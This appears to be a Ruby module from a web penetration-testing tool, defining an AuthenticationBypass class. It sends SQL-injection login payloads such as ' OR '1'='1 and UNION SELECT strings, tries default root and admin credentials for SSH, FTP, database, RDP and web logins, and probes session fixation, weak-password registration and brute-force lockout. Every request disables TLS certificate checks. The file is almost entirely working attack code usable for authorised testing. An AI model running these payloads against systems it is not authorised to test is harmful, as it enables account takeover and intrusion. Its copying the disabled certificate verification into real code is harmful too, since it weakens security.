require 'uri'
require 'net/http'
require_relative '../utils/network'
require_relative '../utils/colorize'

class AuthenticationBypass
  def self.test_sql_injection_auth(url, username_param = 'username', password_param = 'password')
    sqli_payloads = [
      { username: "admin'--", password: "" },
      { username: "admin'#", password: "" },
      { username: "admin'/*", password: "" },
      { username: "' OR '1'='1", password: "' OR '1'='1" },
      { username: "' OR 1=1--", password: "" },
      { username: "' OR 1=1#", password: "" },
      { username: "admin' OR '1'='1", password: "password" },
      { username: "admin' OR 1=1--", password: "password" },
      { username: "' UNION SELECT NULL--", password: "" },
      { username: "admin' UNION SELECT 'admin','password'--", password: "password" }
    ]
    
    results = []
    
    sqli_payloads.each do |payload|
      begin
        uri = URI(url)
        http = Net::HTTP.new(uri.host, uri.port)
        http.use_ssl = uri.scheme == 'https'
        http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl
        
        req = Net::HTTP::Post.new(uri.path)
        req.set_form_data(username_param => payload[:username], password_param => payload[:password])
        
        res = http.request(req)
        
        if res.code.to_i == 200 || res.code.to_i == 302
          if !res.body.include?('error') && !res.body.include?('invalid') && !res.body.include?('failed') && !res.body.include?('incorrect')
            if res.body.include?('welcome') || res.body.include?('dashboard') || res.body.include?('logout') || res['Location']&.include?('dashboard') || res['Location']&.include?('home')
              puts Colorize.red("Authentication bypass via SQLi!")
              puts Colorize.yellow("Username: #{payload[:username]}, Password: #{payload[:password]}")
              results << { payload: payload, vulnerable: true, response_code: res.code }
            end
          end
        end
      rescue => e
      end
    end
    
    results
  end

  def self.test_default_credentials(url, service = nil)
    credentials = {
      'ssh' => [{ user: 'root', pass: 'root' }, { user: 'admin', pass: 'admin' }, { user: 'root', pass: '' }],
      'ftp' => [{ user: 'anonymous', pass: '' }, { user: 'ftp', pass: 'ftp' }, { user: 'admin', pass: 'admin' }],
      'mysql' => [{ user: 'root', pass: '' }, { user: 'root', pass: 'root' }, { user: 'admin', pass: 'admin' }],
      'postgresql' => [{ user: 'postgres', pass: '' }, { user: 'postgres', pass: 'postgres' }],
      'rdp' => [{ user: 'Administrator', pass: '' }, { user: 'admin', pass: 'admin' }],
      'web' => [{ user: 'admin', pass: 'admin' }, { user: 'admin', pass: 'password' }, { user: 'admin', pass: '123456' }, { user: 'root', pass: 'root' }]
    }
    
    creds = service ? credentials[service] || credentials['web'] : credentials['web']
    results = []
    
    creds.each do |cred|
      begin
        uri = URI(url)
        http = Net::HTTP.new(uri.host, uri.port)
        http.use_ssl = uri.scheme == 'https'
        http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl
        
        req = Net::HTTP::Post.new(uri.path)
        req.set_form_data('username' => cred[:user], 'password' => cred[:pass])
        
        res = http.request(req)
        
        if res.code.to_i == 200 || res.code.to_i == 302
          if !res.body.include?('error') && !res.body.include?('invalid') && !res.body.include?('failed')
            puts Colorize.red("Default credentials work!")
            puts Colorize.yellow("Username: #{cred[:user]}, Password: #{cred[:pass]}")
            results << { credentials: cred, vulnerable: true }
          end
        end
      rescue => e
      end
    end
    
    results
  end

  def self.test_session_fixation(url)
    begin
      uri = URI(url)
      http = Net::HTTP.new(uri.host, uri.port)
      http.use_ssl = uri.scheme == 'https'
      http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl
      
      cookie_jar = {}
      
      req1 = Net::HTTP::Get.new(uri.path)
      res1 = http.request(req1)
      
      if res1['Set-Cookie']
        session_id = res1['Set-Cookie'].match(/([^=]+)=([^;]+)/)
        if session_id
          cookie_jar[session_id[1]] = session_id[2]
          puts Colorize.yellow("Initial session ID: #{session_id[2]}")
        end
      end
      
      login_uri = URI.join(url, '/login')
      req2 = Net::HTTP::Post.new(login_uri.path)
      req2.set_form_data('username' => 'test', 'password' => 'test')
      req2['Cookie'] = cookie_jar.map { |k, v| "#{k}=#{v}" }.join('; ')
      
      res2 = http.request(req2)
      
      if res2['Set-Cookie']
        new_session = res2['Set-Cookie'].match(/([^=]+)=([^;]+)/)
        if new_session && new_session[2] == session_id[2]
          puts Colorize.red("Session fixation vulnerability!")
          return { vulnerable: true }
        end
      end
    rescue => e
    end
    
    { vulnerable: false }
  end

  def self.test_weak_password_policy(url)
    weak_passwords = ['123456', 'password', '12345678', 'qwerty', 'abc123', 'monkey', '1234567', 'letmein', 'trustno1', 'dragon', 'baseball', 'iloveyou', 'master', 'sunshine', 'ashley', 'bailey', 'passw0rd', 'shadow', '123123', '654321', 'superman', 'qazwsx', 'michael', 'football']
    
    results = []
    
    weak_passwords.each do |password|
      begin
        uri = URI(url)
        http = Net::HTTP.new(uri.host, uri.port)
        http.use_ssl = uri.scheme == 'https'
        http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl
        
        register_uri = URI.join(url, '/register')
        req = Net::HTTP::Post.new(register_uri.path)
        req.set_form_data('username' => "test#{rand(10000)}", 'password' => password, 'password_confirm' => password, 'email' => "test#{rand(10000)}@test.com")
        
        res = http.request(req)
        
        if res.code.to_i == 200 && !res.body.include?('weak') && !res.body.include?('strong') && !res.body.include?('requirement')
          puts Colorize.yellow("Weak password accepted: #{password}")
          results << { password: password, accepted: true }
        end
      rescue => e
      end
    end
    
    results
  end

  def self.test_brute_force_protection(url, username = 'admin')
    attempts = 0
    locked = false
    
    20.times do |i|
      begin
        uri = URI(url)
        http = Net::HTTP.new(uri.host, uri.port)
        http.use_ssl = uri.scheme == 'https'
        http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl
        
        req = Net::HTTP::Post.new(uri.path)
        req.set_form_data('username' => username, 'password' => "wrong#{i}")
        
        res = http.request(req)
        attempts += 1
        
        if res.body.include?('locked') || res.body.include?('blocked') || res.body.include?('too many') || res.code.to_i == 429
          locked = true
          puts Colorize.green("Brute force protection triggered after #{attempts} attempts")
          break
        end
      rescue => e
      end
    end
    
    if !locked
      puts Colorize.red("No brute force protection detected after #{attempts} attempts")
    end
    
    { protected: locked, attempts: attempts }
  end
end

